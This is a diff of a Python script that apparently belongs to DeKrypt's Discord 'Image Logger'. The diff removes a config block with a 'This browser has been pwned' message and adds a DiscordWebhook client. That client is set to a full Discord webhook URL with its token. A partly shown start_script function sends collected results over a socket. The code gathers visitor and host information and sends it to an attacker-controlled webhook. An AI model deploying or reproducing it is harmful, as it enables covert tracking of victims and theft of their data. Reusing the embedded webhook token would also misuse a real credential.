@@ -1,5 +1,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
+from discord_webhook import DiscordWebhook, DiscordEmbed
 import traceback, requests, base64, httpagentparser, webbrowser
 import sys
 import socket
@@ -9,19 +10,7 @@ import time
 import platform
 import tempfile
 import webbrowser
-
-config = {
-  "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m",
-  "imageArgument": True,
-  "username": "Image Logger", 
-  "color": 0x00FFFF,
-  "message": {
-        "doMessage": False, 
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", 
-        "richMessage": True, 
-  },
-  "linkAlerts": True,
-}
+import select
 
 def get_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -60,6 +49,9 @@ def start_script():
         s.send(result)
 
     s.close()
+  
+content = "Placeholder Message"
+webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m", username="")
 
 if __name__ == '__main__':
     while True:
